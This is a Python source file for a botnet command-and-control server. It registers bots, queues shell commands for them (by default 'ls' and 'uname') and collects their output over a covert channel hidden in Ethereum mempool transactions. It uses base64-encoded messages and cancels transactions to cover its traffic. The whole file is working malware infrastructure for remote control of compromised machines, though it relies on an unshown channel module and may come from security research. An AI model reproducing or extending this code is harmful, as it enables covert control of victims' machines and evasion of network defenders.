from covert_channel import CovertChannel
from web3 import Web3
import time
from termcolor import colored, cprint
import logging as log
import base64
import threading


## Unimplemented
class Bot:
    ID = None
    address = None
    private_key = None

    pending_commands = list()

    last_nonce = 0

    def __init__(self, _ID:str, _address:str, _priv_key:str, _commands:list):
        self.ID = _ID
        self.address = _address
        self.private_key = _priv_key
        self.pending_commands = _commands

    def getCMD(self):
        if len(self.pending_commands) > 0:
            next_cmd = self.pending_commands.pop(0)
            return next_cmd
        else:
            return False


    def getBotID(self):
        return self.ID


##
#   @brief Structure for automaticaly encoding messages to protocol specifications
#   
#
#   Message Structure (in bytes)
#       
#   Origin:1 | base64( BotID:5 | Nonce:3 | Message:X )
#
#
class MempoolMessage:
    botID = None
    message = None
    msg_nonce = None
    origin = None

    ##
    #   @param _botID       A string containing the bot ID
    #   @param _message     A string containing the payload of the message
    #   @param _msg_nonce   Integer that represent the sequence number of the communication
    #   @param _origin      Specifies if the message is sent from the C2C server or bot ("server", "C", or "R")
    #
    def __init__(self, _botID:str, _message:str, _msg_nonce:int, _origin:str):
        self.botID = _botID
        self.message = _message
        self.msg_nonce = _msg_nonce

        if _origin == "server" or _origin == "C":
            self.origin = "C"   #Server message
        else:
            self.origin = "R"   #Client Response

    ##
    #   @brief Return the string rappresentation of the message
    #
    def __getMsgString(self) -> str:
        origin = self.origin
        enc_data = MempoolMessage.encodeData(self.botID + str(self.msg_nonce).zfill(3) + self.message)
        return origin + enc_data

    def __repr__(self):
        return self.__getMsgString()
    def __str__(self):
        return self.__getMsgString()


    def getData(self) -> str:
        return self.message

    def getBotID(self) -> str:
        return self.botID

    def getNonce(self) -> int:
        return int(self.msg_nonce)

    def getMessage(self) -> str:
        return self.message

    def getOrigin(self) -> str:
        return self.origin

    def setMessage(self, _message:str):
        self.message = _message

    ##
    #   @brief Decode an encoded message
    #   @return The decoded data as string
    #

    @staticmethod
    def decodeData(data:str):
        base64_bytes = data.encode('UTF-8')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('UTF-8')
        return message

    ##
    #   @brief Encode an plaintext message
    #   @return The encoded data as string
    #
    @staticmethod
    def encodeData(data:str):
        enc_result = data.encode('UTF-8')
        base64_bytes = base64.b64encode(enc_result)
        base64_message = base64_bytes.decode('UTF-8')
        return base64_message

    ##
    #   @brief Loads an enconded message
    #   @return A MempoolMessage instance
    #
    @staticmethod
    def load(encoded_message_string:str):
        message_string = MempoolMessage.decodeData(encoded_message_string[1:])        

        msg = MempoolMessage(message_string[0:5], message_string[8:], message_string[5:8], encoded_message_string[0])

        return msg




##
#   @brief Manages channels with clients (bots)
#
#

class C2C:
    #List all the available bots
    bots = None             #List of available "bot_id" strings
    available_bots = None   #List of "Bot" objects representing active bots

    issued_commands = None

    dest_addr = None
    priv_key = None


    loop_thread = None
    loop_sem = False

    covert_ch = None

    pending_response = False

    #List of commands to execute once a bot connects
    commands = None


    def __init__(self, _dest_addr:str=None, _priv_key:str=None, _commands=None):
        self.bots = set()
        self.available_bots = set()
        self.issued_commands = set()


        self.dest_addr = _dest_addr
        self.priv_key = _priv_key

        if _commands is None:
            my_commands = list(('ls', 'uname', 'STOP'))     #Default commands
            self.commands = my_commands
        else:
            self.commands = _commands


    def __registerBot(self, bot_id:str):
            self.bots.add(bot_id)

            new_bot = Bot(bot_id, "", "", self.commands)
            self.available_bots.add(new_bot)
            print(colored('New Bot ID: ', 'green') + str(bot_id))


    def __isBotRegistered(self, bot_id:str) -> bool:
        if bot_id in self.bots:
            return True
        return False


    ##
    #   @brief Parse a Mempool message and check if the command should be processed
    #   @param data The MempoolMessage to parse
    #   
    #   @return True in case the command should be processed, False otherwise
    #
    def parseCommand(self, data:MempoolMessage):

        if data is False:
            return False

        #TODO: handle in a better way
        if data in self.issued_commands:
            return False
        else:    
            self.issued_commands.add(data)

        log.debug("parseCommand:" + str(data))

        if data.getMessage() == "START":
            bot_id = data.getBotID()
            if bot_id not in self.bots:
                self.__registerBot(bot_id)
                cprint("NEW BOT SUBSCRIBED", 'green', attrs=['bold', 'blink'],)
                return True
            return False

        elif data.getMessage() == "STOP":
            log.debug("Command already issued")
            return False

        elif data.getOrigin() == "C":    #Command issued by server

            bot_id = data.getBotID()

            if bot_id not in self.bots:  #Check if commands belong to an old bot
                return True

            return False
        elif data.getOrigin() == "R":    #Bot response
            cprint("Bot response received", 'green', attrs=['bold'],)
            res = data.getMessage()
            print("Output: \n\n")
            cprint(str(res) + "\n\n", 'green', attrs=['bold'],)

            self.pending_response = False

            return True
        return False


    def __C2CLoop(self, channel:CovertChannel):
        
        log.info("Waiting for messages...")

        while self.loop_sem:

            data = channel.recvData()

            if data is False:   #If no data is captured
                time.sleep(1)
                continue


            dec_data = data.decode('utf-8')
            recv_msg = MempoolMessage.load(dec_data)

            log.info("Received: " + str(recv_msg))

            if self.parseCommand(recv_msg):             #If the command is parsed correctly

                time.sleep(4)

                log.debug("BOT ID: " + recv_msg.getBotID())


                if recv_msg.getBotID() not in self.bots:
                    log.info("Found messages related to old bots, cancelling...")
                    channel.cancelTransaction()
                    log.info("Transaction cancelled")
                    continue


                next_command = "STOP"

                response_msg = MempoolMessage(recv_msg.getBotID(), next_command, str(recv_msg.getNonce() + 1), "server")


                for bot in self.available_bots:
                    if bot.getBotID() == recv_msg.getBotID():
                        next_command = bot.getCMD()

                log.info("Sending '" + str(next_command) + "' command")

                response_msg.setMessage(next_command)
                log.debug(str(response_msg))
                channel.sendData(str(response_msg), overwrite=True, nonceMsg=response_msg.getNonce()) 






    ##
    #   @brief Start the C2C instance
    #   
    #   @param node_endpoint    The endpoint for Web3
    #
    #   Once a bot register, the C2C server will send commands taken from the configuration file
    #
    def start(self, node_endpoint:str):
        w3_node = Web3(Web3.HTTPProvider(node_endpoint))

        self.covert_ch = CovertChannel(w3_node, self.priv_key, self.dest_addr)



        self.loop_sem = True
        self.loop_thread = threading.Thread(target=self.__C2CLoop, args=(self.covert_ch,))
        
        log.debug("Starting loop thread")
        self.loop_thread.start()


    ##
    #   @brief Stop the C2C server
    #
    def stop(self):
        self.covert_ch.close()

        if self.loop_thread is None:
            log.warning("C2C already stopped")
            return
        
        self.loop_sem = False
        self.loop_thread.join()
        log.info("C2C Stopped")
        self.loop_thread = None

        

    def sendCMD(self, cmd):
        if self.loop_thread is None or self.loop_sem is False:
            log.error("C2C not started")
        

        if self.pending_response == True:
            print("Clearing previous commands")
            self.covert_ch.cancelTransaction()
            self.pending_response = False

        self.covert_ch.sendData(cmd)
